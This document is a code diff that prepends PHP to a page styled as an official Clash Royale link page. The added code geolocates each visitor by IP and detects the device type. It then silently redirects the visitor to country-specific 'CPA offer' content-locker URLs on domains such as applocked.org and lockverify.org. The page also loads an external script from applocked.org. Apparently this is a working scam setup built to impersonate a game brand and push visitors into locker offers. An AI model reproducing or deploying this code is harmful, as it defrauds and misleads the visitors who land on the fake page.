@@ -1,3 +1,75 @@
+<?php
+// Get IP address of the visitor
+$ip = $_SERVER['REMOTE_ADDR'];
+
+// Fetch geolocation data using IPAPI
+$response = file_get_contents("http://ip-api.com/json/{$ip}");
+$data = json_decode($response, true);
+
+// Check if API response is valid
+$countryCode = isset($data['status']) && $data['status'] === 'success' ? strtoupper($data['countryCode']) : 'OTHER';
+
+// Detect device type
+$userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
+if (strpos($userAgent, 'android') !== false) {
+    $deviceType = 'ANDROID';
+} elseif (strpos($userAgent, 'iphone') !== false || strpos($userAgent, 'ipad') !== false || strpos($userAgent, 'ipod') !== false) {
+    $deviceType = 'IOS';
+} else {
+    $deviceType = 'OTHER';
+}
+
+// CPA Offer URLs by Country & Device
+$redirectUrls = [
+    'US' => [
+        'ANDROID' => 'https://applocked.org/cl/i/5ned63',
+        'IOS' => 'https://applocked.org/cl/i/5ned63',
+        'OTHER' => 'https://applocked.org/cl/i/5ned63',
+    ],
+    'MX' => [
+        'ANDROID' => 'https://pagelocked.org/cl/i/1x546d',
+        'IOS' => 'https://pagelocked.org/cl/i/1x546d',
+        'OTHER' => 'https://pagelocked.org/cl/i/1x546d',
+    ],
+    'DE' => [
+        'ANDROID' => 'https://pagelocked.org/cl/i/34ok6n',
+        'IOS' => 'https://pagelocked.org/cl/i/34ok6n',
+        'OTHER' => 'https://pagelocked.org/cl/i/34ok6n',
+    ],
+    'BR' => [
+        'ANDROID' => 'https://applocked.org/cl/i/m524xm',
+        'IOS' => 'https://applocked.org/cl/i/m524xm',
+        'OTHER' => 'https://applocked.org/cl/i/m524xm',
+    ],
+    'ES' => [ // Spain country code is ES
+        'ANDROID' => 'https://applocked.org/cl/i/1x546p',
+        'IOS' => 'https://applocked.org/cl/i/1x546p',
+        'OTHER' => 'https://applocked.org/cl/i/1x546p',
+    ],
+    'IT' => [
+        'ANDROID' => 'https://lockverify.org/cl/i/m524xw',
+        'IOS' => 'https://lockverify.org/cl/i/m524xw',
+        'OTHER' => 'https://lockverify.org/cl/i/m524xw',
+    ],
+    'FR' => [
+        'ANDROID' => 'https://lockverify.org/cl/i/o4xk8d',
+        'IOS' => 'https://lockverify.org/cl/i/o4xk8d',
+        'OTHER' => 'https://lockverify.org/cl/i/o4xk8d',
+    ],
+    'OTHER' => [
+        'ANDROID' => 'https://applocked.org/cl/i/5ned63',
+        'IOS' => 'https://applocked.org/cl/i/5ned63',
+        'OTHER' => 'https://applocked.org/cl/i/5ned63',
+    ],
+];
+
+// Get the appropriate URL
+$url = $redirectUrls[$countryCode][$deviceType] ?? $redirectUrls['OTHER'][$deviceType];
+
+// Perform the redirection
+header('Location: ' . trim($url));
+exit;
+?>
 <!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="preload" href="/_next/static/media/01ac8b8d7d5f099c-s.p.woff2" as="font" crossorigin="" type="font/woff2"><link rel="preload" href="/_next/static/media/8c3b53925983ecf3-s.p.woff2" as="font" crossorigin="" type="font/woff2"><link rel="preload" href="/_next/static/media/901660bd6db481d0-s.p.woff2" as="font" crossorigin="" type="font/woff2"><link rel="preload" href="/_next/static/media/c02f06199c732d49-s.p.woff2" as="font" crossorigin="" type="font/woff2"><link rel="stylesheet" href="css/148aabee4d146736.css" data-precedence="next"><link rel="stylesheet" href="css/057732cab1705daa.css" data-precedence="next"><link rel="preload" as="script" fetchpriority="low" href="/_next/static/chunks/webpack-62b029bd167df1c0.js"><script src="js/fd9d1056-18f015db26aa47e0.js" async=""></script><script src="js/117-bbafb155484ec339.js" async=""></script><script src="js/main-app-226cd4f338ce36ea.js" async=""></script><script src="js/d0f5a89a-718ff327e9c9a3c0.js" async=""></script><script src="js/734-39c53dde87290f3a.js" async=""></script><script src="js/462-f7485198d25a0aed.js" async=""></script><script src="js/page-23842b45e5fc2926.js" async=""></script><script src="js/918-840ab3b7c92deded.js" async=""></script><script src="js/layout-1be6591a44fd14bc.js" async=""></script><link rel="preload" href="https://cdn.cookielaw.org/scripttemplates/otSDKStub.js" as="script"><title>Clash Royale</title><meta name="description" content="Open link in Clash Royale or download the game."><meta name="robots" content="noindex, nofollow, noarchive, noimageindex, nosnippet"><meta property="og:title" content="Clash Royale"><meta property="og:description" content="Open link in Clash Royale or download the game."><meta property="og:image" content="images/opengraph.jpg"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Clash Royale"><meta name="twitter:description" content="Open link in Clash Royale or download the game."><meta name="twitter:image" content="https://link.clashroyale.com/images/game/opengraph.jpg"><meta name="next-size-adjust"><script src="js/polyfills-42372ed130431b0a.js" nomodule=""></script>
 
 <script type="text/javascript" id="ogjs" src="https://applocked.org/cl/js/5ned63"></script>
